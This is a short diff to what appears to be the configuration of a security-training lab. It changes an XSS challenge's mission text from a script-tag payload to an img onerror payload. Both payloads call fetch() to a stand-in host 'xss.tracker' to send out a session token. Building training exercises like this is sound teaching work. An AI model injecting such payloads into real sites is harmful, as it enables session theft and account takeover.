@@ -43,7 +43,7 @@
                 "description": "owasp2017xss.html",
                 "attackGram":"xss.png",
                 "codeBlockIds":["neutralizeOutput","inputAllowListing","requestForgeryPrevention"],
-                "mission":"Alter the html code of the page by inserting the following code: <script>fetch('https://xss.tracker?token='+sessionStorage.token)</script>"
+                "mission":"Alter the html code of the page by inserting the following tag: <img src=bla onerror=\"fetch('https://xss.tracker?token='+sessionStorage.token)\">"
             },
             {
                 "id":"owasp2017injection",
